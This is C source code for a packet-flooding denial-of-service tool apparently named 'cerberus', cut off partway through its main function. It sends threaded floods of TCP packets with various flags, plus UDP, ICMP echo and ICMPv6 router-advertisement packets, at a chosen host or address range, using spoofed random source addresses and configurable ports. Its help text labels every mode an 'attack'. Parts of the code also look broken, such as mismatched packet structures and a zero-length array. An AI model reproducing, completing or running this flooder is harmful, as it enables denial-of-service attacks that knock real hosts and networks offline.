/*
 __         .' '.
        _/__)        .   .       .
       (8|)_}}- .      .        .
        `\__)    '. . ' ' .  . '
        Bee happy
*/
#ifndef _BSD_SOURCE
#define _BSD_SOURCE
#endif
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <netinet/in_systm.h>
#include <sys/socket.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <string.h>
#include <time.h>
#include <signal.h>
#ifndef __USE_BSD
#define __USE_BSD
#endif
#ifndef __FAVOR_BSD
#define __FAVOR_BSD
#endif
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip6.h>
#include <netinet/ip_icmp.h>
#include <netinet/icmp6.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <pthread.h>
#define INET_ADDR 16
#define INET6_ADDR 46
#define TCP_FIN 1
#define TCP_SYN 2
#define TCP_RST 4
#define TCP_PSH 8
#define TCP_ACK 16
#define TCP_URG 32
#define TCP_ECE 64
#define TCP_CWR 128
#define TCP_NOF 256
#define TCP_FRG 512
#define TCP_BMB 1024
#define UDP_BMB 2048
#define RAW_BMB 4096
#define UDP_CFF 8192
#define ICMP_ECHO_G 16384
#define ICMP6_ROUTERADV 134
#define ICMP_HDRLEN 8
#define TH_NOF 0x0
#ifdef LINUX
#define FIX(x) htons(x)
#else
#define FIX(x) (x)
#endif
void *send_tcp(void* arg);
void *send_udp(void* arg);
void *send_icmp(void* arg);
void *send_icmp_ra(void* arg);
void *send_bomb(void* arg);
void handle_exit(int sig);
unsigned short in_cksum(unsigned short *addr, int len);
unsigned short xchecksum(unsigned short *buffer, int size);
char *class2ip(const char *class);
char *class2ip6(const char *class);
void inject(struct ip *ip, u_char p, u_char len);
void inject6(struct ip6_hdr *ip, u_char p, u_char len);
u_long lookup(const char *host);
int main(int argc, char *argv[]);
#define MAX_THREADS 32768
pthread_t attack_thread[MAX_THREADS];
struct thread_data {
int initialized; // valid thread?
int flag4, flag6; // v4 or v6
int start;
int packets;
unsigned int timeout; // attack timeout
int thread;
unsigned int bombsize; // size of connect bomb
unsigned int datasize; // size of tcp data after header
unsigned int window_size; // window size
int socket; // rawsock
int a_flags; // a_flags
struct sockaddr_in destination4;
struct sockaddr_in6 destination6;
u_long dstaddr;
u_char th_flags;
int d_lport;
int d_hport;
int s_lport;
int s_hport;
char *src_class;
char *dst_class;
char SrcIP4[INET_ADDR];
char SrcIP6[INET6_ADDR];
char DestIP4[INET_ADDR];
char DestIP6[INET6_ADDR];
};
struct thread_data thread_data_array[MAX_THREADS];
void handle_exit (int sig) {
int packets;
packets = thread_data_array[1].packets + thread_data_array[2].packets + thread_data_array[4].packets + thread_data_array[8].packets + thread_data_array[16].packets
+ thread_data_array[32].packets + thread_data_array[64].packets + thread_data_array[128].packets + thread_data_array[256].packets
+ thread_data_array[512].packets + thread_data_array[1024].packets + thread_data_array[2048].packets + thread_data_array[4096].packets
+ thread_data_array[8192].packets + thread_data_array[16384].packets;
printf ("Packeting completed, %d total, %d seconds, %d pps\n", packets, (int) time (NULL) -
thread_data_array[0].start, packets / ((int) time (NULL) - thread_data_array[0].start));
exit (0);
}
struct pseudo_hdr {
u_long saddr, daddr;
u_char mbz, ptcl;
u_short tcpl;
};
struct checksum {
struct pseudo_hdr pseudo;
struct tcphdr tcp;
};
unsigned short
in_cksum(unsigned short *addr, int len) {
int nleft = len;
int sum = 0;
unsigned short *w = addr;
unsigned short answer = 0;
while (nleft > 1) {
sum += *w++;
nleft -= 2;
}
if (nleft == 1) {
*(unsigned char *) (&answer) = *(unsigned char *)w;
sum += answer;
}
sum = (sum >> 16) + (sum & 0xffff); /* add hi 16 to low 16 */
sum += (sum >> 16);
answer = ~sum;
return answer;
}
unsigned short
xchecksum(unsigned short *buffer, int size) {
unsigned int sum = 0;
__asm__ __volatile__(
"movl (%1), %0\n"
"subl $4, %2\n"
"jbe 2f\n"
"addl 4(%1), %0\n"
"adcl 8(%1), %0\n"
"adcl 12(%1), %0\n"
"1:\n"
"adcl 16(%1), %0\n"
"lea 4(%1), %1\n"
"decl %2\n"
"jne 1b\n"
"adcl $0, %0\n"
"movl %0, %2\n"
"shrl $16, %0\n"
"addw %w2, %w0\n"
"adcl $0, %0\n"
"notl %0\n"
"2:\n"
: "=r" (sum), "=r" (buffer), "=r" (size)
: "1" (buffer), "2" (size)
);
return(sum);
}
char *src_class, *dst_class = NULL;
char *class2ip(const char *class) {
static char ip[INET_ADDR];
int i, j;
for (i = 0, j = 0; class[i] != '\0'; ++i)
if (class[i] == '.')
++j;
switch (j) {
case 0:
sprintf(ip, "%s.%d.%d.%d", class, (int) random() % 245+1, (int) random() % 225+1, (int) random() % 215+1);
break;
case 1:
sprintf(ip, "%s.%d.%d", class, (int) random() % 245+1, (int) random() % 215+1);
break;
case 2:
sprintf(ip, "%s.%d", class, (int) random() % 245+1);
break;
default: strncpy(ip, class, INET_ADDR);
break;
}
return ip;
}
char *class2ip6(const char *class) {
static char ip[INET6_ADDR];
uint16_t n;
int x, y;
for (x = 0, y = 0; class[x] != '\0'; ++x)
if (class[x] == ':')
++y;
int i;
for (i = 0; i < 7; i++) {
char hex[3][i];
n = mrand48();
n = rand();
FILE * f = fopen("/dev/urandom", "rb");
fread(&n, sizeof(uint16_t), 1, f);
sprintf(hex[i], "%04X", n);
if(i==0)
strcpy(ip, class);
strcat(ip, hex[i]);
if(i<6)
strcat(ip, "2001:");
}
return ip;
}
void
inject(struct ip *ip, u_char p, u_char len) {
ip->ip_hl = 5;
ip->ip_v = 4;
ip->ip_p = p;
ip->ip_tos = 0x08; /* 0x08 */
ip->ip_id = random();
ip->ip_len = len;
ip->ip_off = 0;
ip->ip_ttl = 255;
ip->ip_dst.s_addr = thread_data_array[0].dst_class != NULL ? inet_addr(class2ip(thread_data_array[0].dst_class)) : thread_data_array[0].dstaddr;
ip->ip_src.s_addr = thread_data_array[0].src_class != NULL ? inet_addr(class2ip(thread_data_array[0].src_class)) : random();
thread_data_array[0].destination4.sin_addr.s_addr = ip->ip_dst.s_addr;
}
void
inject6(struct ip6_hdr *ip, u_char p, u_char len) {
ip->ip6_ctlun.ip6_un1.ip6_un1_flow = htonl ((6 << 28) | (0 << 20) | 0);
ip->ip6_ctlun.ip6_un1.ip6_un1_plen = htons( 8 + len );
ip->ip6_ctlun.ip6_un1.ip6_un1_nxt = p;
ip->ip6_ctlun.ip6_un1.ip6_un1_hlim = 255;
inet_pton (AF_INET6, thread_data_array[0].DestIP6, &ip->ip6_dst);
inet_pton (AF_INET6, thread_data_array[0].src_class, &ip->ip6_src);
thread_data_array[0].destination6.sin6_addr = ip->ip6_dst;
}
u_long lookup(const char *host) {
struct hostent *hp;
if ( (hp = gethostbyname2(host,AF_INET)) == NULL) {
perror("gethostbyname2");
exit(-1);
}
return *(u_long *)hp->h_addr;
}
int resolve (const char *host) {
struct addrinfo hints, *res;
int errcode;
char addrstr[100];
void *ptr;
memset (&hints, 0, sizeof (hints));
hints.ai_family = PF_UNSPEC;
hints.ai_socktype = SOCK_STREAM;
hints.ai_flags |= AI_CANONNAME;
errcode = getaddrinfo (host, NULL, &hints, &res);
if (errcode != 0) {
perror ("[-] getaddrinfo");
exit(-1);
}
while (res) {
inet_ntop (res->ai_family, res->ai_addr->sa_data, addrstr, 100);
switch (res->ai_family) {
case AF_INET:
ptr = &((struct sockaddr_in *) res->ai_addr)->sin_addr;
break;
case AF_INET6:
ptr = &((struct sockaddr_in6 *) res->ai_addr)->sin6_addr;
break;
}
inet_ntop (res->ai_family, ptr, addrstr, 100);
res = res->ai_next;
}
return 0;
}
//resolve(argv[1]); // example if you wish to use
 
void *send_tcp(void* arg) {
struct thread_data *param2 = arg;
struct checksum checksum;
struct packet
{
struct ip ip;
struct tcphdr tcp;
char buf[param2->datasize];
} packet;
struct packet6
{
struct ip6_hdr ip;
struct tcphdr tcp;
char buf[param2->datasize];
} packet6;
printf("[%d] Acquired socket %d\n", param2->thread, param2->socket);
signal(SIGALRM, handle_exit);
alarm(thread_data_array[0].timeout);
if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
{
do
{
memset(&packet, 0x0, sizeof(packet.ip)+sizeof(packet.tcp)+param2->datasize);
inject(&packet.ip, IPPROTO_TCP, FIX(sizeof(packet)));
packet.ip.ip_sum = in_cksum((void *)&packet.ip, sizeof(packet));
checksum.pseudo.daddr = thread_data_array[0].dstaddr;
checksum.pseudo.mbz = 0;
checksum.pseudo.ptcl = IPPROTO_TCP;
checksum.pseudo.tcpl = sizeof(struct tcphdr);
checksum.pseudo.saddr = packet.ip.ip_src.s_addr;
packet.tcp.th_win = htons(65535);
packet.tcp.th_seq = random();
//packet.tcp.th_x2 = 4;
if (param2->th_flags == TH_ACK || param2->a_flags == TCP_FRG)
packet.tcp.th_ack = random();
else
packet.tcp.th_ack = 0;
if(param2->a_flags == TCP_FRG)
{
packet.tcp.th_flags = (rand()%(TH_SYN-TH_FIN))+TH_FIN;
packet.tcp.th_off = sizeof(packet.tcp) / 4;
}
else
{
packet.tcp.th_flags = param2->th_flags;
packet.tcp.th_off = 5;
}
if (param2->th_flags == TH_URG || param2->a_flags == TCP_FRG)
packet.tcp.th_urp = htons(sizeof(packet));
else
packet.tcp.th_urp = 0;
packet.tcp.th_sport = thread_data_array[0].s_lport == 0 ?
random () :
htons(thread_data_array[0].s_lport + (random() %
(thread_data_array[0].s_hport - thread_data_array[0].s_lport + 1)));
packet.tcp.th_dport = thread_data_array[0].d_lport == 0 ?
random () :
htons(thread_data_array[0].d_lport + (random() %
(thread_data_array[0].d_hport - thread_data_array[0].d_lport + 1)));
checksum.tcp = packet.tcp;
packet.tcp.th_sum = xchecksum((void *)&checksum, sizeof(checksum));
param2->packets++;
} while ( sendto(param2->socket, &packet, (sizeof packet),0, (struct sockaddr *)&thread_data_array[0].destination4,
sizeof(thread_data_array[0].destination4)) );
}
if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
{
do
{
//memset(&packet6, 0, sizeof packet6);
memset(&packet6, 0x0, sizeof(packet.ip)+sizeof(packet.tcp)+param2->datasize);
inject6(&packet6.ip, IPPROTO_TCP, FIX(sizeof packet6));
checksum.pseudo.daddr = thread_data_array[0].dstaddr;
checksum.pseudo.mbz = 0;
checksum.pseudo.ptcl = IPPROTO_TCP;
checksum.pseudo.tcpl = sizeof(struct tcphdr);
packet6.tcp.th_win = htons(65535);
packet6.tcp.th_seq = random();
if (param2->th_flags == TH_ACK || param2->a_flags == TCP_FRG)
packet.tcp.th_ack = random();
else
packet.tcp.th_ack = 0;
if(param2->a_flags == TCP_FRG)
{
packet.tcp.th_flags = (rand()%(TH_SYN-TH_FIN))+TH_FIN;
packet.tcp.th_off = sizeof(packet.tcp) / 4;
}
else
{
packet.tcp.th_flags = param2->th_flags;
packet.tcp.th_off = 5;
}
if (param2->th_flags == TH_URG || param2->a_flags == TCP_FRG)
packet.tcp.th_urp = htons(sizeof(packet));
else
packet.tcp.th_urp = 0;
packet6.tcp.th_sport = thread_data_array[0].s_lport == 0 ?
random () :
htons(thread_data_array[0].s_lport + (random() %
(thread_data_array[0].s_hport - thread_data_array[0].s_lport + 1)));
packet6.tcp.th_dport = thread_data_array[0].d_lport == 0 ?
random () :
htons(thread_data_array[0].d_lport + (random() %
(thread_data_array[0].d_hport - thread_data_array[0].d_lport + 1)));
checksum.tcp = packet.tcp;
packet.tcp.th_sum = xchecksum((void *)&checksum, sizeof(checksum));
param2->packets++;
} while ( sendto(param2->socket, &packet6.tcp, (sizeof packet6), 0, (struct sockaddr *)&thread_data_array[0].destination6,sizeof(thread_data_array[0].destination6)) );
}
return 0;
}
void *send_udp(void* arg) {
struct thread_data *param2 = arg;
struct packet
{
struct ip ip;
struct udphdr udp;
char buf[param2->datasize];
} packet;
struct packet6
{
struct ip6_hdr ip;
struct udphdr udp;
char buf[param2->datasize];
} packet6;
printf("[%d] Acquired socket %d\n", param2->thread, param2->socket);
signal(SIGALRM, handle_exit);
alarm(thread_data_array[0].timeout);
if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
{
do
{
memset(&packet, 0x0, sizeof(packet.ip)+sizeof(packet.udp));
inject(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
packet.ip.ip_sum = in_cksum((void *)&packet.ip, sizeof(packet));
packet.udp.uh_sport = thread_data_array[0].s_lport == 0 ?
random () :
htons(thread_data_array[0].s_lport + (random() %
(thread_data_array[0].s_hport - thread_data_array[0].s_lport + 1)));
packet.udp.uh_dport = thread_data_array[0].d_lport == 0 ?
random () :
htons(thread_data_array[0].d_lport + (random() %
(thread_data_array[0].d_hport - thread_data_array[0].d_lport + 1)));
packet.udp.uh_ulen = htons(sizeof packet.udp);
packet.udp.uh_sum = 0;
packet.udp.uh_sum = xchecksum((void *)&packet, sizeof(packet));
param2->packets++;
} while ( sendto(param2->socket, &packet, (sizeof packet), 0, (struct sockaddr *)&thread_data_array[0].destination4,sizeof(thread_data_array[0].destination4)) );
}
else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
{
do
{
memset(&packet6, 0x0, sizeof(packet6.ip)+sizeof(packet6.udp));
inject6(&packet6.ip, IPPROTO_UDP, FIX(sizeof packet6));
packet6.udp.uh_sport = thread_data_array[0].s_lport == 0 ?
random () :
htons(thread_data_array[0].s_lport + (random() %
(thread_data_array[0].s_hport - thread_data_array[0].s_lport + 1)));
packet6.udp.uh_dport = thread_data_array[0].d_lport == 0 ?
random () :
htons(thread_data_array[0].d_lport + (random() %
(thread_data_array[0].d_hport - thread_data_array[0].d_lport + 1)));
packet6.udp.uh_ulen = htons(sizeof packet6.udp);
packet6.udp.uh_sum = 0;
packet6.udp.uh_sum = xchecksum((void *)&packet6, sizeof(packet6));
param2->packets++;
} while ( sendto(param2->socket, &packet6, (sizeof packet6), 0, (struct sockaddr *)&thread_data_array[0].destination6,sizeof(thread_data_array[0].destination6)) );
}
return 0;
}
void *send_icmp(void* arg)
{
struct thread_data *param2 = arg;
struct packet
{
struct ip ip;
struct icmp icmp;
} packet;
struct packet6
{
struct ip6_hdr ip;
struct icmp6_hdr icmp;
} packet6;
printf("[%d] Acquired socket %d\n", param2->thread, param2->socket);
signal(SIGALRM, handle_exit);
alarm(thread_data_array[0].timeout);
if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
{
do
{
memset(&packet, 0x0, sizeof(packet.ip)+sizeof(packet.icmp));
inject(&packet.ip, IPPROTO_ICMP, FIX(sizeof packet));
packet.ip.ip_sum = xchecksum((void *)&packet.ip, sizeof(packet.ip));
packet.icmp.icmp_type = ICMP_ECHO;
packet.icmp.icmp_code = 0;
packet.icmp.icmp_cksum = htons( ~(ICMP_ECHO << 8));
packet.icmp.icmp_id = random() % 255;
packet.icmp.icmp_seq = random() % 255;
param2->packets++;
} while ( sendto( param2->socket, &packet, (sizeof packet),0, (struct sockaddr *)&thread_data_array[0].destination4,
sizeof(thread_data_array[0].destination4)) );
}
else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
{
do
{
memset(&packet6, 0x0, sizeof(packet6.ip)+sizeof(packet6.icmp));
inject6(&packet6.ip, IPPROTO_ICMPV6, FIX(sizeof packet6));
packet6.icmp.icmp6_type = ICMP6_ECHO_REQUEST;
packet6.icmp.icmp6_code = 0;
packet6.icmp.icmp6_cksum = 0;
packet6.icmp.icmp6_cksum = xchecksum((void *)&packet6, sizeof(packet6));
packet6.icmp.icmp6_id = random();
packet6.icmp.icmp6_seq = random();
param2->packets++;
} while ( sendto( param2->socket, &packet6.icmp, (sizeof packet6),0, (struct sockaddr *)&thread_data_array[0].destination6,
sizeof(thread_data_array[0].destination6)) );
}
return 0;
}
 
void *send_icmp_ra(void* arg) {
struct thread_data *param2 = arg;
struct packet6
{
struct ip6_hdr ip;
struct icmp6_hdr icmp;
} packet6;
printf("[%d] Acquired socket %d\n", param2->thread, param2->socket);
signal(SIGALRM, handle_exit);
alarm(thread_data_array[0].timeout);
if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1) {
do {
memset(&packet6, 0, sizeof(packet6.ip)+sizeof(packet6.icmp));
inject6(&packet6.ip, IPPROTO_ICMPV6, FIX(sizeof packet6));
packet6.icmp.icmp6_type = ICMP6_ROUTERADV;
packet6.icmp.icmp6_code = 0;
packet6.icmp.icmp6_cksum = 0;
packet6.icmp.icmp6_cksum = xchecksum((void *)&packet6, sizeof(packet6));
packet6.icmp.icmp6_id = random();
packet6.icmp.icmp6_seq = random();
param2->packets++;
} while ( sendto( param2->socket, &packet6.icmp, (sizeof packet6),0, (struct sockaddr *)&thread_data_array[0].destination6,
sizeof(thread_data_array[0].destination6)) );
}
return 0;
}
void *send_bomb(void* arg) {
struct thread_data *param2 = arg;
struct checksum checksum;
struct packet
{
struct ip ip;
struct tcphdr tcp;
struct udphdr udp;
char buf[param2->bombsize];
} packet;
struct packet6
{
struct ip6_hdr ip;
struct tcphdr tcp;
struct udphdr udp;
char buf[param2->bombsize];
} packet6;
if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
{
if(param2->a_flags == RAW_BMB)
param2->socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
}
else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
{
if(param2->a_flags == RAW_BMB)
param2->socket = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
}
int i;
for (i = sizeof(packet) + 1; i < (param2->bombsize); i++)
{
packet.buf[i] = '\x00';
}
if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
connect(param2->socket, (struct sockaddr *)&thread_data_array[0].destination4, sizeof(struct sockaddr_in));
else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
connect(param2->socket, (struct sockaddr *)&thread_data_array[0].destination6, sizeof(struct sockaddr_in6));
printf("[%d] Acquired socket %d\n", param2->thread, param2->socket);
signal(SIGALRM, handle_exit);
alarm(thread_data_array[0].timeout);
do
{
if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
{
if(param2->a_flags == TCP_BMB || param2->a_flags == RAW_BMB)
{
memset(&packet, 0, sizeof packet);
inject(&packet.ip, IPPROTO_TCP, FIX(sizeof packet));
packet.ip.ip_sum = in_cksum((void *)&packet.ip, sizeof(packet));
checksum.pseudo.daddr = thread_data_array[0].dstaddr;
checksum.pseudo.mbz = 0;
if(param2->a_flags == TCP_BMB)
checksum.pseudo.ptcl = IPPROTO_TCP;
else if(param2->a_flags == RAW_BMB)
checksum.pseudo.ptcl = IPPROTO_RAW;
checksum.pseudo.tcpl = sizeof(struct tcphdr);
checksum.pseudo.saddr = packet.ip.ip_src.s_addr;
packet.tcp.th_win = htons(65535);
packet.tcp.th_seq = random();
packet.tcp.th_off = 5;
//thread_data_array[0].destination4.sin_port = htons(113);
checksum.tcp = packet.tcp;
//packet.tcp.th_sum = xchecksum((void *)&checksum, sizeof(checksum));
}
else if(param2->a_flags == UDP_BMB)
{
memset(&packet, 0, sizeof packet);
inject(&packet.ip, IPPROTO_UDP, FIX(sizeof packet));
packet.ip.ip_sum = in_cksum((void *)&packet.ip, sizeof(packet));
packet.udp.uh_ulen = htons(sizeof packet.udp);
packet.udp.uh_sum = 0;
}
}
else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
{
if(param2->a_flags == TCP_BMB || param2->a_flags == RAW_BMB)
{
memset(&packet6, 0, sizeof packet6);
inject6(&packet6.ip, IPPROTO_TCP, FIX(sizeof packet6));
checksum.pseudo.daddr = thread_data_array[0].dstaddr;
checksum.pseudo.mbz = 0;
if(param2->a_flags == TCP_BMB)
checksum.pseudo.ptcl = IPPROTO_TCP;
else if(param2->a_flags == RAW_BMB)
checksum.pseudo.ptcl = IPPROTO_RAW;
checksum.pseudo.tcpl = sizeof(struct tcphdr);
packet6.tcp.th_win = htons(65535);
packet6.tcp.th_seq = random();
} else if(param2->a_flags == UDP_BMB) {
memset(&packet6, 0, sizeof packet6);
inject6(&packet6.ip, IPPROTO_UDP, FIX(sizeof packet6));
packet6.udp.uh_ulen = htons(sizeof packet6.udp);
packet6.udp.uh_sum = 0;
}
}
param2->packets++;
} while ( send(param2->socket, &packet, sizeof(packet), 0) );
return 0;
}
const char *banner_name = "\e[1;37m(\e[0m\e[0;31mcerberus\e[0m\e[1;37m)\e[0m-\e[1;37mby\e[0m-\e[1;37m(\e[0m\e[0;31mGage\e[0m\e[1;37m)\e[0m";
static void
usage(const char *argv0) {
printf("%s \n", banner_name);
printf(" -U UDP    attack                   \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
printf(" -I ICMP   attack                   \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
printf(" -R Router attack                   \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
printf(" -T TCP  attack                 \e[1;37m(\e[0m0:FIN   1: SYN\e[1;37m)\e[0m\n");
printf("                                \e[1;37m(\e[0m2:RST   3:PUSH\e[1;37m)\e[0m\n");
printf("                                \e[1;37m(\e[0m4:ACK   5: URG\e[1;37m)\e[0m\n");
printf("                                \e[1;37m(\e[0m6:ECE   7: CWR\e[1;37m)\e[0m\n");
printf("                                \e[1;37m(\e[0m8:NOF   9:FRAG\e[1;37m)\e[0m\n");
printf(" -B BMB attack [type,size]   \e[1;37m[\e[0m0:TCP 1:UDP 2:RAW\e[1;37m]\e[0m\n");
printf(" -h destination ip                  \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
printf(" -d destination class               \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
printf(" -s source class/ip                     \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
printf(" -p destination port range [start,end]  \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
printf(" -q source port range [start,end]       \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
printf(" -t timeout                         \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
printf(" -w window size [ 1-65535 ]             \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
printf(" -H help                             \e[1;37m(\e[0m\e[0;31mdisplay this help\e[0m\e[1;37m)\e[0m\n");
printf("\e[1mUsage\e[0m: %s -4 -6 [-U -I -T -B -H -h -d -s -p -q -t -w]\n", argv0);
exit(-1);
}
int
main(int argc, char *argv[]) {
int i = 0, n;
int on = 1;
struct sockaddr_in DestAddress4;
struct sockaddr_in6 DestAddress6;
thread_data_array[0].a_flags = 0;
thread_data_array[0].window_size = 0;
for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2) {
thread_data_array[i].a_flags = 0;
}
while ( (n = getopt(argc, argv, "46T:B:IRUHh:d:s:t:p:q:w:")) != -1) {
char *p;
unsigned int bombsize = 0;
unsigned int datasize = 0;
unsigned int window_size = 0;
switch (n)
{
case '4':
thread_data_array[0].flag4 = 1;
break;
case '6':
thread_data_array[0].flag6 = 1;
break;
case 'T':
if ( (p = (char *) strchr(optarg, ',')) == NULL)
datasize = 4;
if(datasize == 0)
datasize = atoi(p + 1);
if(datasize > 4096)
datasize = 4096;
switch (atoi(optarg))
{
case 0:
thread_data_array[TCP_FIN].initialized = 1;
thread_data_array[0].a_flags |= TCP_FIN;
thread_data_array[TCP_FIN].a_flags |= TCP_FIN;
thread_data_array[TCP_FIN].datasize = datasize;
break;
case 1:
thread_data_array[TCP_SYN].initialized = 1;
thread_data_array[0].a_flags |= TCP_SYN;
thread_data_array[TCP_SYN].a_flags |= TCP_SYN;
thread_data_array[TCP_SYN].datasize = datasize;
break;
case 2:
thread_data_array[TCP_RST].initialized = 1;
thread_data_array[0].a_flags |= TCP_RST;
thread_data_array[TCP_RST].a_flags |= TCP_RST;
thread_data_array[TCP_RST].datasize = datasize;
break;
case 3:
thread_data_array[TCP_PSH].initialized = 1;
thread_data_array[0].a_flags |= TCP_PSH;
thread_data_array[TCP_PSH].a_flags |= TCP_PSH;
thread_data_array[TCP_PSH].datasize = datasize;
break;
case 4:
thread_data_array[TCP_ACK].initialized = 1;
thread_data_array[0].a_flags |= TCP_ACK;
thread_data_array[TCP_ACK].a_flags |= TCP_ACK;
thread_data_array[TCP_ACK].datasize = datasize;
break;
case 5:
thread_data_array[TCP_URG].initialized = 1;
thread_data_array[0].a_flags |= TCP_URG;
thread_data_array[TCP_URG].a_flags |= TCP_URG;
thread_data_array[TCP_URG].datasize = datasize;
break;
case 6:
thread_data_array[TCP_ECE].initialized = 1;
thread_data_array[0].a_flags |= TCP_ECE;
thread_data_array[TCP_ECE].a_flags |= TCP_ECE;
thread_data_array[TCP_ECE].datasize = datasize;
break;
case 7:
thread_data_array[TCP_CWR].initialized = 1;
thread_data_array[0].a_flags |= TCP_CWR;
thread_data_array[TCP_CWR].a_flags |= TCP_CWR;
thread_data_array[TCP_CWR].datasize = datasize;
break;
case 8:
thread_data_array[TCP_NOF].initialized = 1;
thread_data_array[0].a_flags |= TCP_NOF;
thread_data_array[TCP_NOF].a_flags |= TCP_NOF;
thread_data_array[TCP_NOF].datasize = datasize;
break;
case 9:
thread_data_array[TCP_FRG].initialized = 1;
thread_data_array[0].a_flags |= TCP_FRG;
thread_data_array[TCP_FRG].a_flags |= TCP_FRG;
thread_data_array[TCP_FRG].datasize = datasize;
break;
}
break;
case 'B':
if ( (p = (char *) strchr(optarg, ',')) == NULL)
bombsize = 64;
if(bombsize == 0)
bombsize = atoi(p + 1);
if(bombsize > 2048)
bombsize = 2048;
switch (atoi(optarg))
{
case 0:
thread_data_array[TCP_BMB].initialized = 1;
thread_data_array[0].a_flags |= TCP_BMB;
thread_data_array[TCP_BMB].a_flags |= TCP_BMB;
thread_data_array[TCP_BMB].bombsize = bombsize;
break;
case 1:
thread_data_array[UDP_BMB].initialized = 1;
thread_data_array[0].a_flags |= UDP_BMB;
thread_data_array[UDP_BMB].a_flags |= UDP_BMB;
thread_data_array[UDP_BMB].bombsize = bombsize;
break;
case 2:
thread_data_array[RAW_BMB].initialized = 1;
thread_data_array[0].a_flags |= RAW_BMB;
thread_data_array[RAW_BMB].a_flags |= RAW_BMB;
thread_data_array[RAW_BMB].bombsize = bombsize;
break;
}
break;
case 'I':
thread_data_array[ICMP6_ROUTERADV].initialized = 1;
thread_data_array[0].a_flags |= ICMP6_ROUTERADV;
thread_data_array[ICMP6_ROUTERADV].a_flags |= ICMP6_ROUTERADV;
break;
case 'R':
thread_data_array[ICMP_ECHO_G].initialized = 1;
thread_data_array[0].a_flags |= ICMP_ECHO_G;
thread_data_array[ICMP_ECHO_G].a_flags |= ICMP_ECHO_G;
break;
case 'U':
thread_data_array[UDP_CFF].initialized = 1;
thread_data_array[0].a_flags |= UDP_CFF;
thread_data_array[UDP_CFF].a_flags |= UDP_CFF;
break;
case 'h':
if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0)
{
DestAddress4.sin_family = AF_INET;
inet_pton(AF_INET, optarg, &DestAddress4.sin_addr);
thread_data_array[0].dstaddr = lookup(optarg);
thread_data_array[0].destination4 = DestAddress4;
}
else if (thread_data_array[0].flag4 == 0 && thread_data_array[0].flag6 == 1)
{
DestAddress6.sin6_family = AF_INET6;
inet_pton(AF_INET6, optarg, &DestAddress6.sin6_addr);
thread_data_array[0].destination6 = DestAddress6;
}
else
{
printf("-4 and -6 can not both be specified.\n\n");
usage(argv[0]);
}
break;
case 'd':
thread_data_array[0].dst_class = optarg;
break;
case 's':
thread_data_array[0].src_class = optarg;
break;
case 'p':
if ( (p = (char *) strchr(optarg, ',')) == NULL)
usage(argv[0]);
thread_data_array[0].d_lport = atoi(optarg); /* Destination start port */
thread_data_array[0].d_hport = atoi(p + 1); /* Destination end port */
break;
case 'q':
if ( (p = (char *) strchr(optarg, ',')) == NULL)
usage(argv[0]);
thread_data_array[0].s_lport = atoi(optarg); /* Source start port */
thread_data_array[0].s_hport = atoi(p + 1); /* Source end port */
break;
case 't':
thread_data_array[0].timeout = atoi(optarg);
break;
case 'w':
window_size = atoi(optarg);
if(window_size > 65535)
window_size = 65535;
thread_data_array[0].window_size = window_size;
break;
case 'H':
usage(argv[0]);
break;
default:
usage(argv[0]);
break;
}
}
if (!thread_data_array[0].timeout) {
usage(argv[0]);
}
if (!thread_data_array[0].src_class) {
if(thread_data_array[0].flag6 == 1) {
static char ipstring[3];
strcat(ipstring, ":");
thread_data_array[0].src_class = class2ip6(ipstring);
}
}
if ( (!thread_data_array[0].flag4 && !thread_data_array[0].flag6) ||
(!thread_data_array[0].a_flags) ||
(!thread_data_array[0].timeout)
)
{
usage(argv[0]);
}
if (thread_data_array[0].flag4 == 1 && thread_data_array[0].flag6 == 0) {
int i;
for (i = TCP_FIN; i <= ICMP_ECHO_G; i*=2) {
if ( thread_data_array[i].initialized == 1 ) {
if ( thread_data_array[i].a_flags <= TCP_FRG ||
thread_data_array[i].a_flags == RAW_BMB ||
thread_data_array[i].a_flags == ICMP_ECHO_G
)
{
if ( (thread_data_array[i].socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
perror("socket");
exit(-1);
}
}
else if(thread_data_array[i].a_flags == TCP_BMB)
{
if ( (thread_data_array[i].socket = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) < 0) {
perror("socket");
exit(-1);
}
}
else if (thread_data_array[i].a_flags == UDP_BMB || thread_data_array[i].a_flags == UDP_CFF)
{
